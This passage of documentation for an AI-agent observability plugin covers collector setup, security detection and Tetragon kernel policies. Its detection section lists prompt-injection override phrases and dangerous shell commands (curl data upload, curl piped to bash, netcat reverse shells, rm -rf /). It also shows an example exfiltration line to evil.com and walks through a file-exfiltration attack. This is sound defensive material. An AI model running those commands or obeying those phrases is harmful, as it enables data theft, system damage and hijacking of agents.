 path: /tmp/tempo/wal\n\nmetrics_generator:\n  storage:\n    path: /tmp/tempo/generator/wal\n</code></pre>"},{"location":"backends/grafana/#collector-config-fan-out","title":"Collector Config (Fan-Out)","text":"<p>Update <code>collector/otel-collector-config.yaml</code> to export to both Dynatrace and Tempo:</p> <pre><code>exporters:\n  otlphttp/dynatrace:\n    endpoint: \"${DYNATRACE_ENDPOINT}\"\n    headers:\n      Authorization: \"Api-Token ${DYNATRACE_API_TOKEN}\"\n\n  otlp/tempo:\n    endpoint: \"tempo:4317\"\n    tls:\n      insecure: true\n\nservice:\n  pipelines:\n    traces:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [otlphttp/dynatrace, otlp/tempo]\n</code></pre>"},{"location":"backends/grafana/#grafana-data-source","title":"Grafana Data Source","text":"<ol> <li>Open Grafana at <code>http://localhost:3000</code></li> <li>Go to Configuration \u2192 Data Sources \u2192 Add data source</li> <li>Select Tempo</li> <li>Set URL: <code>http://tempo:3200</code></li> <li>Click Save &amp; Test</li> </ol>"},{"location":"backends/grafana/#grafana-dashboards","title":"Grafana Dashboards","text":""},{"location":"backends/grafana/#explore-view","title":"Explore View","text":"<ol> <li>Go to Explore</li> <li>Select the Tempo data source</li> <li>Search by service name: <code>openclaw-gateway</code></li> <li>Or search by span name: <code>openclaw.agent.turn</code> or <code>tool.*</code></li> </ol>"},{"location":"backends/grafana/#example-dashboard-panels","title":"Example Dashboard Panels","text":"<p>Token Usage Over Time (Prometheus/Mimir): <pre><code>sum(rate(openclaw_llm_tokens_total[5m])) by (model)\n</code></pre></p> <p>LLM Latency P95 (Prometheus/Mimir): <pre><code>histogram_quantile(0.95, rate(openclaw_llm_duration_bucket[5m]))\n</code></pre></p> <p>Tool Call Rate (Prometheus/Mimir): <pre><code>sum(rate(openclaw_tool_calls_total[5m])) by (tool_name)\n</code></pre></p> <p>Error Rate (Prometheus/Mimir): <pre><code>sum(rate(openclaw_llm_errors_total[5m])) / sum(rate(openclaw_llm_requests_total[5m])) * 100\n</code></pre></p> <p>Metric name format</p> <p>OTel metrics use dots (<code>openclaw.llm.tokens.total</code>) but Prometheus converts them to underscores (<code>openclaw_llm_tokens_total</code>).</p>"},{"location":"backends/otel-collector/","title":"OpenTelemetry Collector","text":"<p>The repo includes a pre-configured OTel Collector setup via Docker Compose. The collector acts as a pipeline between the plugin and your backend(s).</p>"},{"location":"backends/otel-collector/#architecture","title":"Architecture","text":"<pre><code>flowchart LR\n    A[OpenClaw Plugin] --&gt;|OTLP/HTTP :4318| B[OTel Collector]\n    A --&gt;|OTLP/gRPC :4317| B\n    B --&gt;|Batch + Process| C{Exporters}\n    C --&gt;|OTLP| D[Dynatrace]\n    C --&gt;|OTLP| E[Grafana Tempo]\n    C --&gt;|stdout| F[Debug logs]</code></pre>"},{"location":"backends/otel-collector/#quick-start","title":"Quick Start","text":"<pre><code># Set backend credentials\nexport DYNATRACE_ENDPOINT=https://&lt;YOUR_ENV&gt;.live.dynatrace.com/api/v2/otlp\nexport DYNATRACE_API_TOKEN=&lt;YOUR_ACCESS_TOKEN&gt;\n\n# Start\ndocker compose up -d\n\n# Check health\ndocker compose ps\ndocker compose logs -f otel-collector\n</code></pre>"},{"location":"backends/otel-collector/#collector-configuration","title":"Collector Configuration","text":"<p>The configuration lives in <code>collector/otel-collector-config.yaml</code>.</p>"},{"location":"backends/otel-collector/#default-pipeline","title":"Default Pipeline","text":"<pre><code>service:\n  pipelines:\n    traces:\n      receivers: [otlp]\n      processors: [batch, resource]\n      exporters: [otlphttp/dynatrace, debug]\n\n    metrics:\n      receivers: [otlp]\n      processors: [batch, resource]\n      exporters: [otlphttp/dynatrace, debug]\n\n    logs:\n      receivers: [otlp]\n      processors: [batch, resource]\n      exporters: [otlphttp/dynatrace, debug]\n</code></pre>"},{"location":"backends/otel-collector/#receivers","title":"Receivers","text":"<p>The collector accepts OTLP on both protocols:</p> <ul> <li>gRPC on port <code>4317</code></li> <li>HTTP on port <code>4318</code></li> </ul>"},{"location":"backends/otel-collector/#processors","title":"Processors","text":"<ul> <li>batch \u2014 batches spans/metrics before export (reduces network calls)</li> <li>resource \u2014 adds resource attributes (e.g., <code>deployment.environment</code>)</li> </ul>"},{"location":"backends/otel-collector/#exporters","title":"Exporters","text":"<ul> <li>otlphttp/dynatrace \u2014 forwards to Dynatrace via OTLP/HTTP</li> <li>debug \u2014 prints to stdout (useful during setup)</li> </ul>"},{"location":"backends/otel-collector/#customizing-the-collector","title":"Customizing the Collector","text":""},{"location":"backends/otel-collector/#add-a-second-backend","title":"Add a Second Backend","text":"<p>Export to both Dynatrace and Grafana Tempo:</p> <pre><code>exporters:\n  otlphttp/dynatrace:\n    endpoint: \"${DYNATRACE_ENDPOINT}\"\n    headers:\n      Authorization: \"Api-Token ${DYNATRACE_API_TOKEN}\"\n\n  otlphttp/tempo:\n    endpoint: \"http://tempo:4318\"\n\nservice:\n  pipelines:\n    traces:\n      receivers: [otlp]\n      processors: [batch]\n      exporters: [otlphttp/dynatrace, otlphttp/tempo]\n</code></pre>"},{"location":"backends/otel-collector/#add-filtering","title":"Add Filtering","text":"<p>Drop noisy or unwanted spans:</p> <pre><code>processors:\n  filter:\n    spans:\n      exclude:\n        match_type: regexp\n        span_names:\n          - \"health.*\"\n          - \"internal.*\"\n\nservice:\n  pipelines:\n    traces:\n      processors: [filter, batch]\n</code></pre>"},{"location":"backends/otel-collector/#add-sampling","title":"Add Sampling","text":"<p>Reduce trace volume (keep 10% of traces):</p> <pre><code>processors:\n  probabilistic_sampler:\n    sampling_percentage: 10\n\nservice:\n  pipelines:\n    traces:\n      processors: [probabilistic_sampler, batch]\n</code></pre>"},{"location":"backends/otel-collector/#add-span-enrichment","title":"Add Span Enrichment","text":"<p>Add attributes to all spans:</p> <pre><code>processors:\n  attributes:\n    actions:\n      - key: environment\n        value: production\n        action: upsert\n      - key: team\n        value: ai-platform\n        action: upsert\n</code></pre>"},{"location":"backends/otel-collector/#using-a-custom-collector-image","title":"Using a Custom Collector Image","text":"<p>The default Docker Compose uses <code>otel/opentelemetry-collector-contrib</code>, which includes all exporters. If you only need specific exporters, you can build a custom image:</p> <pre><code>FROM otel/opentelemetry-collector-builder:latest as builder\nCOPY builder-config.yaml /build/config.yaml\nRUN CGO_ENABLED=0 builder --config /build/config.yaml\n\nFROM scratch\nCOPY --from=builder /build/otelcol /otelcol\nENTRYPOINT [\"/otelcol\"]\n</code></pre>"},{"location":"backends/otel-collector/#running-without-docker","title":"Running Without Docker","text":"<p>Install the collector binary directly:</p> <pre><code># Download\ncurl -L https://github.com/open-telemetry/opentelemetry-collector-releases/releases/download/v0.115.0/otelcol-contrib_0.115.0_linux_amd64.tar.gz | tar xz\n\n# Run\n./otelcol-contrib --config collector/otel-collector-config.yaml\n</code></pre>"},{"location":"backends/otel-collector/#monitoring-the-collector","title":"Monitoring the Collector","text":"<p>The collector exposes its own metrics on port <code>8888</code>:</p> <pre><code># Prometheus metrics endpoint\ncurl http://localhost:8888/metrics\n</code></pre> <p>Key metrics to watch:</p> <ul> <li><code>otelcol_exporter_sent_spans</code> \u2014 spans successfully exported</li> <li><code>otelcol_exporter_send_failed_spans</code> \u2014 export failures</li> <li><code>otelcol_receiver_accepted_spans</code> \u2014 spans received from the plugin</li> <li><code>otelcol_processor_batch_batch_send_size</code> \u2014 batch sizes</li> </ul>"},{"location":"backends/otel-collector/#troubleshooting","title":"Troubleshooting","text":""},{"location":"backends/otel-collector/#collector-wont-start","title":"Collector won't start","text":"<pre><code># Check logs\ndocker compose logs otel-collector\n\n# Common issues:\n# - Invalid YAML in config\n# - Port already in use (4317/4318)\n# - Environment variables not set\n</code></pre>"},{"location":"backends/otel-collector/#no-data-flowing","title":"No data flowing","text":"<ol> <li>Check plugin is sending: <code>openclaw otel</code> shows initialized</li> <li>Check collector receives: Look for <code>otelcol_receiver_accepted_spans</code> &gt; 0</li> <li>Check collector exports: Look for <code>otelcol_exporter_sent_spans</code> &gt; 0</li> <li>Check for errors: <code>docker compose logs -f otel-collector | grep error</code></li> </ol>"},{"location":"security/detection/","title":"Real-Time Security Detection","text":"<p>The OpenClaw observability plugin includes a real-time security detection module that identifies threats at the application layer. This complements kernel-level monitoring (Tetragon) by catching threats in the AI agent's context.</p>"},{"location":"security/detection/#detection-overview","title":"Detection Overview","text":"Detection Severity Trigger What It Catches Sensitive File Access Critical <code>tool.Read</code>, <code>tool.Write</code>, <code>tool.Edit</code> Attempts to access credentials, secrets, SSH keys Prompt Injection High/Critical Inbound messages Social engineering attacks on the AI agent Dangerous Commands Critical/High <code>tool.exec</code> Data exfiltration, destructive commands Token Spike Anomaly Warning Metrics (Dynatrace) Unusual usage patterns indicating abuse"},{"location":"security/detection/#detection-1-sensitive-file-access","title":"Detection 1: Sensitive File Access","text":"<p>Triggers when the agent attempts to read, write, or edit files matching sensitive patterns.</p>"},{"location":"security/detection/#patterns-detected","title":"Patterns Detected","text":"<pre><code>.env, .env.*                    # Environment secrets\nopenclaw.json                   # OpenClaw configuration\n.ssh/, id_rsa, id_ed25519       # SSH keys\n.aws/credentials                # AWS credentials\n.kube/config                    # Kubernetes config\n.docker/config.json             # Docker registry auth\ncredentials, password, secret   # Generic sensitive files\napi_key, private_key, token     # API credentials\n</code></pre>"},{"location":"security/detection/#example-telemetry","title":"Example Telemetry","text":"<pre><code>span.name: tool.Read\nspan.status: ERROR\nattributes:\n  security.event.detected: true\n  security.event.detection: sensitive_file_access\n  security.event.severity: critical\n  security.event.description: \"Access to sensitive file: /home/user/.env\"\n  openclaw.tool.input_preview: '{\"path\":\"/home/user/.env\"}'\n</code></pre>"},{"location":"security/detection/#metric","title":"Metric","text":"<pre><code>openclaw.security.sensitive_file_access{file_pattern=\"...\"} +1\n</code></pre>"},{"location":"security/detection/#detection-2-prompt-injection","title":"Detection 2: Prompt Injection","text":"<p>Detects attempts to manipulate the AI agent through crafted messages.</p>"},{"location":"security/detection/#patterns-detected_1","title":"Patterns Detected","text":"<pre><code>ignore previous instructions     # Instruction override\nignore your instructions         \ndisregard all prior              \nforget everything                \n\nSYSTEM:, [SYSTEM], [ADMIN]       # Fake system messages\n[OVERRIDE], &lt;&lt;&lt;SYSTEM            \n\nyou are now, pretend you are     # Role manipulation\nact as if, roleplay as           \n\nbypass safety/security           # Jailbreak attempts\njailbreak, DAN mode              \n</code></pre>"},{"location":"security/detection/#example-telemetry_1","title":"Example Telemetry","text":"<pre><code>span.name: openclaw.request\nspan.status: ERROR\nattributes:\n  security.event.detected: true\n  security.event.detection: prompt_injection\n  security.event.severity: high\n  security.event.description: \"Potential prompt injection: 2 patterns matched\"\nevents:\n  - name: security.alert\n    attributes:\n      security.detection: prompt_injection\n      security.severity: high\n</code></pre>"},{"location":"security/detection/#metric_1","title":"Metric","text":"<pre><code>openclaw.security.prompt_injection{pattern_count=\"2\"} +1\n</code></pre>"},{"location":"security/detection/#detection-3-dangerous-command-execution","title":"Detection 3: Dangerous Command Execution","text":"<p>Catches dangerous shell commands that could exfiltrate data or damage the system.</p>"},{"location":"security/detection/#patterns-detected_2","title":"Patterns Detected","text":"<p>Critical Severity: <pre><code>curl with -d/--data/-F          # Data exfiltration\ncurl | bash/sh                  # Remote code execution\nwget -O - |                     # Piped downloads\nnc/netcat -e                    # Reverse shells\nrm -rf /                        # Recursive deletion\ndd of=/dev/                     # Disk overwrite\nmkfs                            # Filesystem format\nchmod +s                        # Setuid bit\nxmrig, stratum+tcp              # Crypto mining\n</code></pre></p> <p>High Severity: <pre><code>chmod 777                       # World-writable permissions\ncrontab -e, /etc/cron           # Persistence via cron\n.bashrc, .zshrc modification    # Shell profile persistence\n</code></pre></p> <p>Warning Severity: <pre><code>sudo, su -                      # Privilege escalation attempts\nsystemctl enable/start          # Service manipulation\n</code></pre></p>"},{"location":"security/detection/#example-telemetry_2","title":"Example Telemetry","text":"<pre><code>span.name: tool.exec\nspan.status: ERROR\nattributes:\n  security.event.detected: true\n  security.event.detection: dangerous_command\n  security.event.severity: critical\n  security.event.description: \"curl with data upload\"\n  openclaw.tool.input_preview: '{\"command\":\"curl -d @/etc/passwd evil.com\"}'\n</code></pre>"},{"location":"security/detection/#metric_2","title":"Metric","text":"<pre><code>openclaw.security.dangerous_command{command_type=\"curl with data upload\"} +1\n</code></pre>"},{"location":"security/detection/#detection-4-token-spike-anomaly","title":"Detection 4: Token Spike Anomaly","text":"<p>Configured in Dynatrace to detect unusual token consumption patterns.</p>"},{"location":"security/detection/#dql-query","title":"DQL Query","text":"<pre><code>timeseries {\n  current = sum(openclaw.llm.tokens.total),\n  baseline = sum(openclaw.llm.tokens.total, shift:-1d)\n}\n| fieldsAdd spike_ratio = current / baseline\n| filter spike_ratio &gt; 3\n| summarize alert_count = count()\n</code></pre>"},{"location":"security/detection/#dynatrace-metric-event-configuration","title":"Dynatrace Metric Event Configuration","text":"<ol> <li>Go to Settings \u2192 Anomaly Detection \u2192 Metric Events</li> <li>Create new metric event:</li> <li>Name: OpenClaw: Token Usage Spike</li> <li>Metric: <code>openclaw.llm.tokens.total</code></li> <li>Aggregation: Rate per 5 minutes</li> <li>Condition: &gt; 3x baseline (1h average, 1d offset)</li> <li>Severity: Warning</li> </ol>"},{"location":"security/detection/#viewing-security-events-in-dynatrace","title":"Viewing Security Events in Dynatrace","text":""},{"location":"security/detection/#distributed-traces","title":"Distributed Traces","text":"<ol> <li>Navigate to Distributed Traces</li> <li>Filter by: <code>security.event.detected = true</code></li> <li>Or filter by severity: <code>security.event.severity = critical</code></li> </ol>"},{"location":"security/detection/#metrics","title":"Metrics","text":"<p>Create a dashboard with these charts:</p> <pre><code># Security Events Over Time\nopenclaw.security.events:count:splitBy(\"detection\",\"severity\")\n\n# Sensitive File Access by Pattern\nopenclaw.security.sensitive_file_access:count:splitBy(\"file_pattern\")\n\n# Dangerous Commands by Type\nopenclaw.security.dangerous_command:count:splitBy(\"command_type\")\n</code></pre>"},{"location":"security/detection/#alerting","title":"Alerting","text":"<p>Create metric events for immediate notification:</p> <pre><code># Critical: Any sensitive file access\nMetric: openclaw.security.sensitive_file_access:count\nThreshold: &gt; 0\nSeverity: Critical\n\n# High: Prompt injection attempts\nMetric: openclaw.security.prompt_injection:count\nThreshold: &gt; 0\nSeverity: High\n\n# High: Dangerous command execution\nMetric: openclaw.security.dangerous_command:count\nThreshold: &gt; 0\nSeverity: High\n</code></pre>"},{"location":"security/detection/#layered-security-plugin-tetragon","title":"Layered Security: Plugin + Tetragon","text":"<p>The plugin security detection works at the application layer (AI agent context), while Tetragon monitors at the kernel layer. Together they provide defense in depth:</p> Layer Tool Visibility Catches Application Plugin Tool calls, messages, agent context What the AI intends to do Kernel Tetragon System calls, file access, processes What actually happens"},{"location":"security/detection/#example-file-exfiltration-attack","title":"Example: File Exfiltration Attack","text":"<ol> <li>Plugin detects: <code>tool.Read</code> on <code>.env</code> file \u2192 <code>sensitive_file_access</code> alert</li> <li>Tetragon detects: <code>security_file_open</code> on <code>/home/user/.env</code> \u2192 kernel event</li> <li>Plugin detects: <code>tool.exec</code> with <code>curl -d</code> \u2192 <code>dangerous_command</code> alert</li> <li>Tetragon detects: <code>sys_execve</code> of <code>/usr/bin/curl</code> \u2192 kernel event</li> <li>Tetragon detects: Network egress to unknown IP \u2192 (if network policy enabled)</li> </ol> <p>Both layers emit events to the same OTel Collector \u2192 Dynatrace, enabling cross-correlation.</p>"},{"location":"security/detection/#extending-detection-patterns","title":"Extending Detection Patterns","text":"<p>To add custom patterns, edit <code>src/security.ts</code>:</p> <pre><code>// Add to SENSITIVE_FILE_PATTERNS\n/my-custom-secret\\.txt/i,\n\n// Add to PROMPT_INJECTION_PATTERNS\n/my-company-specific-phrase/i,\n\n// Add to DANGEROUS_COMMAND_PATTERNS\n{ pattern: /my-dangerous-tool/i, severity: \"high\", desc: \"custom tool usage\" },\n</code></pre> <p>Restart the gateway to apply changes:</p> <pre><code>openclaw gateway restart\n</code></pre>"},{"location":"security/detection/#see-also","title":"See Also","text":"<ul> <li>Tetragon Kernel Security \u2014 Kernel-level monitoring</li> <li>Architecture \u2014 How the plugin integrates with OpenClaw</li> <li>Configuration \u2014 Plugin configuration options</li> </ul>"},{"location":"security/tetragon/","title":"Kernel-Level Security with Tetragon","text":"<p>Tetragon provides eBPF-based security observability at the Linux kernel level. While the OpenClaw plugin captures application-level telemetry, Tetragon sees what actually happens at the system call level \u2014 file access, process execution, network connections, and privilege changes.</p> <p>This is defense in depth: the application layer shows what the agent intended to do; the kernel layer shows what it actually did.</p>"},{"location":"security/tetragon/#why-tetragon-for-openclaw","title":"Why Tetragon for OpenClaw?","text":"<p>AI agents can execute commands, read files, and make network connections. Even with application-level monitoring, a compromised or manipulated agent could:</p> <ul> <li>Access sensitive files (<code>.env</code>, SSH keys, credentials)</li> <li>Execute dangerous commands (<code>rm -rf</code>, <code>curl | sh</code>)</li> <li>Attempt privilege escalation</li> <li>Make unexpected network connections</li> </ul> <p>Tetragon catches all of this at the kernel level \u2014 tamper-proof and impossible to bypass.</p>"},{"location":"security/tetragon/#installation","title":"Installation","text":""},{"location":"security/tetragon/#prerequisites","title":"Prerequisites","text":"<ul> <li>Linux kernel 5.4+ (BTF support required)</li> <li>Root access for installation</li> <li>systemd (for service management)</li> </ul>"},{"location":"security/tetragon/#install-tetragon","title":"Install Tetragon","text":"<pre><code># Download latest release\ncurl -LO https://github.com/cilium/tetragon/releases/latest/download/tetragon-v1.6.0-amd64.tar.gz\n\n# Extract\ntar -xzf tetragon-v1.6.0-amd64.tar.gz\ncd tetragon-v1.6.0-amd64\n\n# Install\nsudo ./install.sh\n\n# Verify installation\ntetra version\n</code></pre>"},{"location":"security/tetragon/#create-openclaw-policy-directory","title":"Create OpenClaw Policy Directory","text":"<pre><code>sudo mkdir -p /etc/tetragon/tetragon.tp.d/openclaw\n</code></pre>"},{"location":"security/tetragon/#tracingpolicies-for-openclaw","title":"TracingPolicies for OpenClaw","text":"<p>Create the following policy files in <code>/etc/tetragon/tetragon.tp.d/openclaw/</code>:</p>"},{"location":"security/tetragon/#1-process-execution-monitoring","title":"1. Process Execution Monitoring","text":"<p>Captures every command executed by Node.js (OpenClaw).</p> <pre><code># /etc/tetragon/tetragon.tp.d/openclaw/01-process-exec.yaml\napiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\nmetadata:\n  name: openclaw-process-exec\nspec:\n  kprobes:\n    - call: \"sys_execve\"\n      syscall: true\n      args:\n        - index: 0\n          type: \"string\"\n        - index: 1\n          type: \"string\"\n      selectors:\n        - matchBinaries:\n            - operator: \"In\"\n              values:\n                - \"/usr/bin/node\"\n                - \"/usr/local/bin/node\"\n          matchActions:\n            - action: Post\n</code></pre>"},{"location":"security/tetragon/#2-sensitive-file-access-detection","title":"2. Sensitive File Access Detection","text":"<p>Alerts when OpenClaw accesses sensitive files.</p> <pre><code># /etc/tetragon/tetragon.tp.d/openclaw/02-sensitive-files.yaml\napiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\nmetadata:\n  name: openclaw-sensitive-files\nspec:\n  kprobes:\n    - call: \"security_file_open\"\n      syscall: false\n      args:\n        - index: 0\n          type: \"file\"\n      selectors:\n        - matchBinaries:\n            - operator: \"In\"\n              values:\n                - \"/usr/bin/node\"\n                - \"/usr/local/bin/node\"\n          matchArgs:\n            - index: 0\n              operator: \"Prefix\"\n              values:\n                - \"/etc/shadow\"\n                - \"/etc/passwd\"\n                - \"/etc/sudoers\"\n                - \"/root/\"\n                - \".ssh/\"\n                - \".aws/\"\n                - \".kube/\"\n                - \".config/gcloud/\"\n                - \".openclaw/\"\n                - \".env\"\n          matchActions:\n            - action: Post\n</code></pre>"},{"location":"security/tetragon/#3-privilege-escalation-detection","title":"3. Privilege Escalation Detection","text":"<p>Catches attempts to change user/group ID.</p> <pre><code># /etc/tetragon/tetragon.tp.d/openclaw/04-privilege-escalation.yaml\napiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\nmetadata:\n  name: openclaw-privilege-escalation\nspec:\n  kprobes:\n    - call: \"sys_setuid\"\n      syscall: true\n      args:\n        - index: 0\n          type: \"int\"\n      selectors:\n        - matchBinaries:\n            - operator: \"In\"\n              values:\n                - \"/usr/bin/node\"\n                - \"/usr/local/bin/node\"\n          matchActions:\n            - action: Post\n    - call: \"sys_setgid\"\n      syscall: true\n      args:\n        - index: 0\n          type: \"int\"\n      selectors:\n        - matchBinaries:\n            - operator: \"In\"\n              values:\n                - \"/usr/bin/node\"\n                - \"/usr/local/bin/node\"\n          matchActions:\n            - action: Post\n</code></pre>"},{"location":"security/tetragon/#4-dangerous-command-detection","title":"4. Dangerous Command Detection","text":"<p>Flags potentially dangerous binaries.</p> <pre><code># /etc/tetragon/tetragon.tp.d/openclaw/05-dangerous-commands.yaml\napiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\nmetadata:\n  name: openclaw-dangerous-commands\nspec:\n  kprobes:\n    - call: \"sys_execve\"\n      syscall: true\n      args:\n        - index: 0\n          type: \"string\"\n        - index: 1\n          type: \"string\"\n      selectors:\n        - matchArgs:\n            - index: 0\n              operator: \"Postfix\"\n              values:\n                - \"/rm\"\n                - \"/dd\"\n                - \"/nc\"\n                - \"/netcat\"\n                - \"/ncat\"\n                - \"/curl\"\n                - \"/wget\"\n                - \"/chmod\"\n                - \"/chown\"\n          matchActions:\n            - action: Post\n</code></pre>"},{"location":"security/tetragon/#5-kernel-module-loading","title":"5. Kernel Module Loading","text":"<p>Detects attempts to load kernel modules (critical security event).</p> <pre><code># /etc/tetragon/tetragon.tp.d/openclaw/06-kernel-modules.yaml\napiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\nmetadata:\n  name: openclaw-kernel-modules\nspec:\n  kprobes:\n    - call: \"__x64_sys_init_module\"\n      syscall: true\n      args:\n        - index: 2\n          type: \"string\"\n      selectors:\n        - matchActions:\n            - action: Post\n    - call: \"__x64_sys_finit_module\"\n      syscall: true\n      args:\n        - index: 2\n          type: \"string\"\n      selectors:\n        - matchActions:\n            - action: Post\n</code></pre>"},{"location":"security/tetragon/#configure-tetragon-export","title":"Configure Tetragon Export","text":"<p>Configure Tetragon to export events to a log file that the OTel Collector can read:</p> <pre><code># Set export file\necho \"/var/log/tetragon/tetragon.log\" | sudo tee /etc/tetragon/tetragon.conf.d/export-filename\n\n# Set file permissions (readable by collector)\necho \"644\" | sudo tee /etc/tetragon/tetragon.conf.d/export-file-perm\n\n# Rotate at 50MB\necho \"50\" | sudo tee /etc/tetragon/tetragon.conf.d/export-file-max-size-mb\n\n# Keep 3 backup files\necho \"3\" | sudo tee /etc/tetragon/tetragon.conf.d/export-file-max-backups\n</code></pre>"},{"location":"security/tetragon/#start-tetragon","title":"Start Tetragon","text":"<pre><code># Enable and start\nsudo systemctl enable tetragon\nsudo systemctl start tetragon\n\n# Verify policies loaded\nsudo systemctl status tetragon\n\n# Watch events in real-time\nsudo tetra getevents -o compact\n</code></pre>"},{"location":"security/tetragon/#otel-collector-integration","title":"OTel Collector Integration","text":"<p>Add the Tetragon filelog receiver to your collector configuration:</p> <pre><code>receivers:\n  # ... existing receivers ...\n\n  filelog/tetragon:\n    include:\n      - /var/log/tetragon/tetragon.log\n    start_at: end\n    operators:\n      - type: json_parser\n        parse_from: body\n        timestamp:\n          parse_from: attributes.time\n          layout: '%Y-%m-%dT%H:%M:%S.%LZ'\n\nprocessors:\n  # ... existing processors ...\n\n  # Transform Tetragon events\n  transform/tetragon:\n    error_mode: ignore\n    log_statements:\n      - context: log\n        statements:\n          # Identify event type\n          - set(attributes[\"tetragon.type\"], \"kprobe\") where attributes[\"process_kprobe\"] != nil\n          - set(attributes[\"tetragon.type\"], \"exec\") where attributes[\"process_exec\"] != nil\n          - set(attributes[\"tetragon.type\"], \"exit\") where attributes[\"process_exit\"] != nil\n\n          # Extract policy name\n          - set(attributes[\"tetragon.policy\"], attributes[\"process_kprobe\"][\"policy_name\"]) where attributes[\"process_kprobe\"][\"policy_name\"] != nil\n\n          # Extract process info\n          - set(attributes[\"process.binary\"], attributes[\"process_kprobe\"][\"process\"][\"binary\"]) where attributes[\"process_kprobe\"][\"process\"][\"binary\"] != nil\n          - set(attributes[\"process.pid\"], attributes[\"process_kprobe\"][\"process\"][\"pid\"]) where attributes[\"process_kprobe\"][\"process\"][\"pid\"] != nil\n\n          # Extract function name\n          - set(attributes[\"tetragon.function\"], attributes[\"process_kprobe\"][\"function_name\"]) where attributes[\"process_kprobe\"][\"function_name\"] != nil\n\n          # Assign security risk levels\n          - set(attributes[\"security.risk\"], \"critical\") where attributes[\"tetragon.policy\"] == \"openclaw-privilege-escalation\"\n          - set(attributes[\"security.risk\"], \"critical\") where attributes[\"tetragon.policy\"] == \"openclaw-kernel-modules\"\n          - set(attributes[\"security.risk\"], \"high\") where attributes[\"tetragon.policy\"] == \"openclaw-sensitive-files\"\n          - set(attributes[\"security.risk\"], \"high\") where attributes[\"tetragon.policy\"] == \"openclaw-dangerous-commands\"\n          - set(attributes[\"security.risk\"], \"low\") where attributes[\"tetragon.policy\"] == \"openclaw-process-exec\"\n\n  # Add service metadata\n  resource/tetragon:\n    attributes:\n      - key: service.name\n        value: \"openclaw-security\"\n        action: upsert\n      - key: tetragon.version\n        value: \"1.6.0\"\n        action: upsert\n\nservice:\n  pipelines:\n    # ... existing pipelines ...\n\n    logs/tetragon:\n      receivers: [filelog/tetragon]\n      processors: [transform/tetragon, resource/tetragon, batch]\n      exporters: [otlphttp/dynatrace]  # or your exporter\n</code></pre>"},{"location":"security/tetragon/#collector-permissions","title":"Collector Permissions","text":"<p>The OTel Collector needs read access to the Tetragon log file:</p> <pre><code># Make log readable\nsudo chmod 644 /var/log/tetragon/tetragon.log\n\n# Or add collector user to appropriate group\nsudo usermod -a -G adm otelcol-contrib\n</code></pre>"},{"location":"security/tetragon/#event-examples","title":"Event Examples","text":""},{"location":"security/tetragon/#process-execution-event","title":"Process Execution Event","text":"<pre><code>{\n  \"process_kprobe\": {\n    \"process\": {\n      \"binary\": \"/usr/bin/node\",\n      \"pid\": 58856,\n      \"uid\": 1000,\n      \"cwd\": \"/home/user\"\n    },\n    \"parent\": {\n      \"binary\": \"/usr/bin/node\",\n      \"pid\": 56271\n    },\n    \"function_name\": \"__x64_sys_execve\",\n    \"args\": [\n      {\"string_arg\": \"/bin/sh\"},\n      {\"string_arg\": \"-c ls -la\"}\n    ],\n    \"policy_name\": \"openclaw-process-exec\"\n  },\n  \"time\": \"2026-02-04T15:13:03.638Z\"\n}\n</code></pre>"},{"location":"security/tetragon/#sensitive-file-access-event","title":"Sensitive File Access Event","text":"<pre><code>{\n  \"process_kprobe\": {\n    \"process\": {\n      \"binary\": \"/usr/bin/node\",\n      \"pid\": 58900\n    },\n    \"function_name\": \"security_file_open\",\n    \"args\": [\n      {\"file_arg\": {\"path\": \"/home/user/.ssh/id_rsa\"}}\n    ],\n    \"policy_name\": \"openclaw-sensitive-files\"\n  },\n  \"time\": \"2026-02-04T15:14:22.123Z\"\n}\n</code></pre>"},{"location":"security/tetragon/#alerting-on-security-events","title":"Alerting on Security Events","text":"<p>In your observability backend (Dynatrace, Grafana, etc.), create alerts for:</p> Alert Condition Severity Privilege Escalation <code>tetragon.policy == \"openclaw-privilege-escalation\"</code> Critical Kernel Module Load <code>tetragon.policy == \"openclaw-kernel-modules\"</code> Critical Sensitive File Access <code>tetragon.policy == \"openclaw-sensitive-files\"</code> High Dangerous Command <code>tetragon.policy == \"openclaw-dangerous-commands\"</code> High Unusual Process Exec <code>tetragon.policy == \"openclaw-process-exec\"</code> AND off-hours Medium"},{"location":"security/tetragon/#complete-observability-stack","title":"Complete Observability Stack","text":"<p>With Tetragon integrated, you have three layers of visibility:</p> Layer Source What It Shows Application OpenClaw Plugin Tool calls, tokens, request flow Gateway diagnostics-otel Session health, queues, costs Kernel Tetragon System calls, file access, network <p>This provides defense in depth \u2014 even if application-level telemetry is manipulated, kernel-level events reveal the truth.</p>"},{"location":"security/tetragon/#troubleshooting","title":"Troubleshooting","text":""},{"location":"security/tetragon/#tetragon-not-starting","title":"Tetragon not starting","text":"<pre><code># Check logs\nsudo journalctl -u tetragon -n 50\n\n# Common issues:\n# - Kernel too old (need 5.4+)\n# - BTF not available\n# - Policy YAML syntax error\n</code></pre>"},{"location":"security/tetragon/#events-not-appearing-in-collector","title":"Events not appearing in collector","text":"<pre><code># Check Tetragon is writing events\nsudo tail -f /var/log/tetragon/tetragon.log\n\n# Check file permissions\nls -la /var/log/tetragon/tetragon.log\n\n# Check collector logs\nsudo journalctl -u otelcol-contrib | grep tetragon\n</code></pre>"},{"location":"security/tetragon/#high-kernel-overhead","title":"High kernel overhead","text":"<p>If Tetragon causes performance issues, reduce policy scope:</p> <ul> <li>Use <code>matchBinaries</code> to limit to Node.js only</li> <li>Remove high-volume policies (like process-exec) if not needed</li> <li>Increase rate limits in policies</li> </ul>"},{"location":"security/tetragon/#resources","title":"Resources","text":"<ul> <li>Tetragon Documentation</li> <li>TracingPolicy Reference</li> <li>Cilium/Tetragon GitHub</li> </ul>"},{"location":"telemetry/metrics/","title":"Metrics Reference","text":"<p>All metrics use the <code>openclaw.*</code> namespace and are exported via OTLP at the configured interval (default: 30 seconds).</p>"},{"location":"telemetry/metrics/#llm-metrics","title":"LLM Metrics","text":""},{"location":"telemetry/metrics/#openclawllmrequests","title":"<code>openclaw.llm.requests</code>","text":"Type Counter Unit requests Description Total number of LLM API requests made <p>Tracks every call to Anthropic or OpenAI APIs. Use this to understand request volume over time.</p>"},{"location":"telemetry/metrics/#openclawllmerrors","title":"<code>openclaw.llm.errors</code>","text":"Type Counter Unit errors Description Total number of LLM API errors <p>Counts failed LLM calls (rate limits, 